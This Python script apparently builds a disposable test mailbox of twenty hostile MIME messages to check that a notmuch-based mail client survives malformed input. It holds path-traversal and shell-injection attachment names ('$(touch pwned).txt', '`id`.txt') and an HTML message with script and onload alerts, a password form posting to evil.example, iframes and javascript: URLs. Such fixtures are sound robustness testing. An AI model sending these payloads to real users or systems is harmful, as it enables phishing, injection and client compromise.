#!/usr/bin/env python3
"""Builds a disposable notmuch database of HOSTILE mail for the live test `mailSurvivesHostileMime` (S-8).

Run as an ordinary user on the DISPOSABLE test Debian (never on a real mailbox):
    python3 make_hostile_mime_fixture.py <root dir>      # creates <root>/Maildir, <root>/nm.conf and indexes it
The messages exercise what a hostile sender controls: MIME structure (deep and wide), headers (huge, encoded-word floods, bad
dates), encodings (unknown charsets, broken base64/quoted-printable), attachment names (path traversal, bidirectional overrides,
control characters, huge), HTML (script, forms, meta refresh, data: URLs, nested tables) and reply graphs (loops, long chains).
Every message has Message-ID <hostile-NN@fixture> and the subject "HOSTILE NN ...".
"""
import base64, os, subprocess, sys
from pathlib import Path

root = Path(sys.argv[1])
maildir = root / "Maildir"
for d in ("cur", "new", "tmp"):
    (maildir / d).mkdir(parents=True, exist_ok=True)

messages = []


def add(n, subject, body, headers="", ctype="text/plain; charset=utf-8", extra=""):
    h = (f"From: Mallory <mallory{n}@example.org>\nTo: me@example.net\nSubject: HOSTILE {n:02d} {subject}\n"
         f"Date: Wed, 21 Oct 2026 10:{n % 60:02d}:00 +0000\nMessage-ID: <hostile-{n:02d}@fixture>\nMIME-Version: 1.0\n"
         f"{headers}Content-Type: {ctype}\n{extra}\n")
    messages.append((n, h + body))


def b64(data, wrap=76):
    s = base64.b64encode(data).decode()
    return "\n".join(s[i:i + wrap] for i in range(0, len(s), wrap)) + "\n"


# 01: multipart nested 150 levels deep
inner = "--L0\nContent-Type: text/plain\n\ndeepest text\n--L0--\n"
body = inner
for i in range(1, 150):
    body = f"--L{i}\nContent-Type: multipart/mixed; boundary=L{i-1}\n\n{body}--L{i}--\n"
add(1, "nested 150 levels", body, ctype="multipart/mixed; boundary=L149")

# 02: 3000 small attachments
parts = "".join(f"--W\nContent-Type: application/octet-stream; name=f{i}.bin\nContent-Disposition: attachment; filename=f{i}.bin\n"
                "Content-Transfer-Encoding: base64\n\nAAAA\n" for i in range(3000))
add(2, "3000 attachments", "--W\nContent-Type: text/plain\n\nbody\n" + parts + "--W--\n", ctype="multipart/mixed; boundary=W")

# 03: 200 KB subject on one line, 20000 encoded words in From
messages.append((3, ("From: " + " ".join("=?UTF-8?B?QQ==?=" for _ in range(20000)) + " <enc@example.org>\nTo: me@example.net\n"
                     "Subject: HOSTILE 03 " + "A" * 200000 + "\nDate: Wed, 21 Oct 2026 10:03:00 +0000\nMessage-ID: <hostile-03@fixture>\n"
                     "MIME-Version: 1.0\nContent-Type: text/plain\n\nhuge headers\n")))

# 04: unknown charset, broken base64, broken quoted-printable, unknown transfer encoding
add(4, "bad encodings",
    "--E\nContent-Type: text/plain; charset=x-no-such-charset\n\ncaf\xe9 \x00 \xff\n"
    "--E\nContent-Type: text/plain; charset=utf-8\nContent-Transfer-Encoding: base64\n\n!!!not base64!!!====\n"
    "--E\nContent-Type: text/plain; charset=utf-8\nContent-Transfer-Encoding: quoted-printable\n\n=ZZ=\n=\n=C3=\n"
    "--E\nContent-Type: text/plain\nContent-Transfer-Encoding: x-weird\n\nstrange\n--E--\n", ctype="multipart/mixed; boundary=E")

# 05: boundaries: missing end, wrong boundary, empty boundary, boundary with odd characters
add(5, "broken boundaries", "--B\nContent-Type: text/plain\n\nnever closed\n--B\nContent-Type: text/plain\n\nstill open\n", ctype="multipart/mixed; boundary=B")
add(6, "boundary not in body", "this body never mentions the boundary\n", ctype="multipart/mixed; boundary=NOPE")
add(7, "empty boundary", "--\nContent-Type: text/plain\n\nx\n----\n", ctype='multipart/mixed; boundary=""')

# 08: attachment names: traversal, bidi override, control characters, long name, dot files, reserved punctuation
names = ["../../etc/passwd", "..\\\\..\\\\windows\\\\system32\\\\evil.exe", "invoice‮txt.exe", "tab\there.pdf", "=?utf-8?q?line=0Abreak.txt?=",
         ".bashrc", "a" * 5000 + ".pdf", "con", "-rf", "$(touch pwned).txt", "`id`.txt", "semi;colon.txt", "star*.txt", "q\"uote.txt"]
parts = ""
for i, nme in enumerate(names):
    cd = f"attachment; filename*=UTF-8''{''.join('%%%02X' % b for b in nme.encode())}" if not nme.startswith("=?") else f'attachment; filename="{nme}"'
    parts += f"--N\nContent-Type: application/octet-stream\nContent-Disposition: {cd}\nContent-Transfer-Encoding: base64\n\n{b64(b'data' + bytes([i]))}"
add(8, "hostile attachment names", "--N\nContent-Type: text/plain\n\nnames\n" + parts + "--N--\n", ctype="multipart/mixed; boundary=N")

# 09: hostile HTML, 3 MB with active content and nested tables
html = ("<html><head><meta http-equiv='refresh' content='0;url=http://evil.example/'><link rel=stylesheet href=//evil.example/x.css>"
        "<style>@import url(http://evil.example/i.css); body{background:url(http://evil.example/b.png)}</style></head><body onload='alert(1)'>"
        "<form action=http://evil.example method=post><input name=pw type=password></form><iframe src=http://evil.example></iframe>"
        "<a href='javascript:alert(1)'>click</a><img src='data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+'>"
        "<svg onload=alert(1)><script>alert(1)</script></svg><object data=http://evil.example></object><embed src=http://evil.example>"
        + "<table><tr><td>" * 400 + "x" + "</td></tr></table>" * 400 + "<p>" + "filler " * 400000 + "</p></body></html>")
add(9, "hostile html 3MB", html + "\n", ctype="text/html; charset=utf-8")

# 10: 100 alternatives
alts = "".join(f"--A\nContent-Type: text/plain; charset=utf-8\n\nalternative {i}\n" for i in range(100))
add(10, "100 alternatives", alts + "--A--\n", ctype="multipart/alternative; boundary=A")

# 11: message/rfc822 nested 40 levels
inner = "From: x@example.org\nSubject: inner\nContent-Type: text/plain\n\nthe innermost mail\n"
for i in range(40):
    inner = f"From: x{i}@example.org\nSubject: level {i}\nMIME-Version: 1.0\nContent-Type: message/rfc822\n\n{inner}"
add(11, "forward nested 40 levels", f"--F\nContent-Type: text/plain\n\nforwarded\n--F\nContent-Type: message/rfc822\n\n{inner}--F--\n", ctype="multipart/mixed; boundary=F")

# 12: 8 MB attachment, listed but never loaded
add(12, "8 MB attachment", "--G\nContent-Type: text/plain\n\nbig file attached\n--G\nContent-Type: application/zip; name=big.zip\n"
    "Content-Disposition: attachment; filename=big.zip\nContent-Transfer-Encoding: base64\n\n" + b64(os.urandom(8 * 1024 * 1024)) + "--G--\n",
    ctype="multipart/mixed; boundary=G")

# 13: reply loop (A <-> B) and a 3000-long References chain
add(13, "loop A", "a\n", headers="In-Reply-To: <hostile-14@fixture>\nReferences: <hostile-14@fixture>\n")
add(14, "loop B", "b\n", headers="In-Reply-To: <hostile-13@fixture>\nReferences: <hostile-13@fixture>\n")
refs = " ".join(f"<chain-{i}@fixture>" for i in range(3000))
add(15, "3000 references", "c\n", headers="References: " + refs + "\nIn-Reply-To: <chain-2999@fixture>\n")

# 16: dates and recipients: garbage date, 2000 recipients
add(16, "garbage date and 2000 recipients", "d\n", headers="Date: 99999999999999999999\nCc: " + ", ".join(f"r{i}@example.org" for i in range(2000)) + "\n")
messages[-1] = (16, messages[-1][1].replace("Date: Wed, 21 Oct 2026 10:16:00 +0000\n", ""))

# 17: body with control characters, ANSI escapes, NUL, lone surrogates in UTF-8, 1 MB single line
add(17, "control characters", "esc \x1b[31mred\x1b[0m bell \x07 nul \x00 bidi ‮⁦ zero​" + "x" * 1000000 + "\n")

# 18: content-type garbage
add(18, "garbage content-type", "x\n", ctype="te\\xt/pl;;;ain; charset=\"unterminated")
add(19, "no content-type value", "x\n", ctype="")
add(20, "multipart without parts", "\n", ctype="multipart/mixed; boundary=Z")

for n, text in messages:
    (maildir / "new" / f"hostile-{n:02d}.eml").write_bytes(text.replace("\n", "\r\n").encode("utf-8", "surrogateescape") if n == 3 else
                                                           text.encode("utf-8", "surrogateescape"))

conf = root / "nm.conf"
conf.write_text(f"[database]\npath={maildir}\n[user]\nname=Fixture\nprimary_email=me@example.net\n[new]\ntags=unread;inbox\n[search]\nexclude_tags=deleted;spam\n")
env = dict(os.environ, NOTMUCH_CONFIG=str(conf))
subprocess.run(["notmuch", "new"], env=env, check=True, stdout=subprocess.DEVNULL)
print("messages:", subprocess.run(["notmuch", "count"], env=env, capture_output=True, text=True).stdout.strip(), "of", len(messages))
